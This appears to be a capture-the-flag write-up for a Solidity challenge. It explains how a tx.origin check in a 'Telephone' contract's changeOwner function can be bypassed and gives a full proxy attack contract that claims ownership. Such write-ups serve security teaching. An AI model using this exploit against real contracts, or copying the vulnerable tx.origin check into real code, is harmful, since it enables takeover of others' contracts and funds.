# Requirements

- Claim ownership of the contract.

# Attack explanation

To claim ownership of the contract, we need to exploit changeOwner and its tx.origin vulnerability.

```
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

We will be able to set the desired owner if the tx.origin is different than the msg sender. We can achieve this by using an proxy SC to attack Telephone contract. In this way, the tx.origin will be different than msg sender.

# Attack function

We could solve the challenge by just using the following proxy sc attack contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract MaliciousContract {
    address public vulnerableScAddress;
    address public attacker;

    constructor(address _vulnerableScAddress) {
        vulnerableScAddress = _vulnerableScAddress;
        attacker = msg.sender;
    }

    function attack() public {
        vulnerableScAddress.call(
            abi.encodeWithSignature("changeOwner(address)", attacker)
        );
    }
}

```
